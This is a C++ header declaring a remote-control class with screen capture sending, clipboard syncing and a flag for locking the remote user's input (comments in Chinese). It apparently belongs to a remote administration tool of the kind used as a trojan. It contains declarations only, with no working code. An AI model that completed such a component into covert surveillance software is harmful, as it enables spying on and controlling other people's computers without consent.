#pragma once
#include "Manager.h"
#include"ScreenSpy.h"
class CRemoteController :
    public CManager
{
public:
    CRemoteController(CIocpClient* IocpClient);
    ~CRemoteController();
    void HandleIo(PBYTE BufferData, ULONG_PTR BufferLength);
    static  DWORD WINAPI  SendDataProcedure(LPVOID ParameterData);    //截图发送
    VOID SendBitmapInfo();
    VOID SendFirstData();
    VOID SendNextData();
    VOID AnalyzeCommand(LPBYTE BufferData, ULONG BufferLength);
    VOID SendClipboardData();
    VOID UpdateClipboardData(char* BufferData, ULONG BufferLength);  //服务器向客户端更新数据
public:
    BOOL    m_IsLoop;
    HANDLE  m_ThreadHandle;
    CScreenSpy* m_ScreenSpy;  //指针
    BOOL    m_IsBlockInput;   //如果为TRUE代表将客户端操作锁定
};

